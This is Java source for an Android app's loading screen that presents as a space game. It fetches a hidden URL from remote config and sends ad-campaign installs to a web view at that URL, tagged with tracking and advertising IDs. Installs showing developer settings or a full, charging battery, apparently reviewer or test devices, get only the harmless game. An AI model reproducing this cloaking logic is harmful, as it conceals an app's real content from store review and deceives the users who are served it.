package com.adventure.space;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.os.BatteryManager;
import android.os.Bundle;
import android.widget.ImageView;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.bumptech.glide.Glide;
import com.facebook.FacebookSdk;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONObject;

import java.util.Map;

public class WaitingActivity extends AppCompatActivity {
    ImageView loadingGif;
    SharedPreferences spref;

    public boolean charging;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_waiting);

        loadingGif = (ImageView)findViewById(R.id.loadingGif);
        Glide.with(this).load(R.drawable.anim).into(loadingGif);

        loadServices();

        spref = getSharedPreferences("Settings", MODE_PRIVATE);

        switch(isFirstGame()) {
            case 1:
                if (!getGameUrl().isEmpty()) {
                     startActivity(new Intent(WaitingActivity.this, SiteActivity.class));
                     finish();
                } else {
                    startActivity(new Intent(WaitingActivity.this, MainActivity.class));
                    finish();
                }
                break;
            case 0:
                if (((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo() == null) {
                    startActivity(new Intent(WaitingActivity.this, MainActivity.class));
                    finish();
                } else {
                    initAppsFlyer();
                }
                break;
        }

    }

    public void initAppsFlyer(){
        AppsFlyerLib.getInstance().init(getResources().getString(R.string.af_dev_key), new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> conversionData) {
                if (isFirstAppsFlyer()) {
                    FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                    FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                            .setMinimumFetchIntervalInSeconds(3600)
                            .build();
                    firebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                    firebaseRemoteConfig.fetchAndActivate()
                            .addOnCompleteListener(WaitingActivity.this, new OnCompleteListener<Boolean>() {
                                @Override
                                public void onComplete(@NonNull Task<Boolean> task) {
                                    try {
                                        String gameString = firebaseRemoteConfig.getValue("second_key").asString();
                                        JSONObject jsonObject = new JSONObject(conversionData);
                                        if (jsonObject.optString("af_status").equals("Non-organic")) {
                                            String campaign = jsonObject.optString("campaign");
                                            if (campaign.isEmpty() || campaign.equals("null")) campaign = jsonObject.optString("c");
                                            String[] splitsCampaign = campaign.split("_");
                                            try{
                                                OneSignal.sendTag("user_id", splitsCampaign[2]);
                                            }catch(Exception e){

                                            }
                                            String mainUrl = gameString + "?naming=" + campaign + "&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=" + jsonObject.optString("ad_id");
                                            setGameUrl(mainUrl);
                                            appFlush();
                                            startActivity(new Intent(WaitingActivity.this, SiteActivity.class));
                                            finish();
                                        } else if (jsonObject.optString("af_status").equals("Organic")) {
                                            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                                            int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                                            isPhonePluggedIn();
                                            if (((batLevel == 100 || batLevel == 90) && charging) || (android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                                             android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0) != 0)) {
                                                setGameUrl("");
                                                appFlush();
                                                startActivity(new Intent(WaitingActivity.this, MainActivity.class));
                                                finish();
                                            } else {
                                                String mainUrl = gameString + "?naming=null&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=null";
                                                setGameUrl(mainUrl);
                                                appFlush();
                                                startActivity(new Intent(WaitingActivity.this, SiteActivity.class));
                                                finish();
                                            }
                                        } else {
                                            setGameUrl("");
                                            appFlush();
                                            startActivity(new Intent(WaitingActivity.this, MainActivity.class));
                                            finish();
                                        }
                                        setFirstAppsFlyer(false);
                                        setFirstGame(1);
                                        appFlush();
                                    } catch (Exception ex) {
                                    }
                                }
                            });
                }
            }

            @Override
            public void onConversionDataFail(String errorMessage) {
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> attributionData) {
            }

            @Override
            public void onAttributionFailure(String errorMessage) {
            }
        }, this);
        AppsFlyerLib.getInstance().start(this);
        AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(true);
    }

    public void loadServices(){
        OneSignal.initWithContext(this);
        OneSignal.setAppId(getResources().getString(R.string.one_signal_app_id));
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();
    }

    public void appFlush(){
        AppsFlyerLib.getInstance().unregisterConversionListener();
    }

    public void isPhonePluggedIn() {
        charging = false;
        final Intent batteryIntent;
        batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean batteryCharge = status==BatteryManager.BATTERY_STATUS_CHARGING;
        int chargePlug = batteryIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        if (batteryCharge) {charging=true;}
        if (usbCharge) {charging=true;}
        if (acCharge) {charging=true;}
    }

    public int isFirstGame() {
        return spref.getInt("first_game", 0);
    }

    public void setFirstGame(int firstGame) {
        spref.edit().putInt("first_game", firstGame).apply();
    }

    public boolean isFirstAppsFlyer() {
        return spref.getBoolean("first_appsflyer", true);
    }

    public void setFirstAppsFlyer(boolean firstAppsFlyer) {
        spref.edit().putBoolean("first_appsflyer", firstAppsFlyer).apply();
    }

    public boolean isFirstRef() {
        return spref.getBoolean("first_ref", true);
    }

    public void setFirstRef(boolean firstRef) {
        spref.edit().putBoolean("first_ref", firstRef).apply();
    }

    public String getGameUrl() {
        return spref.getString("url", "");
    }

    public void setGameUrl(String gameUrl) {
        spref.edit().putString("url", gameUrl).apply();
    }
}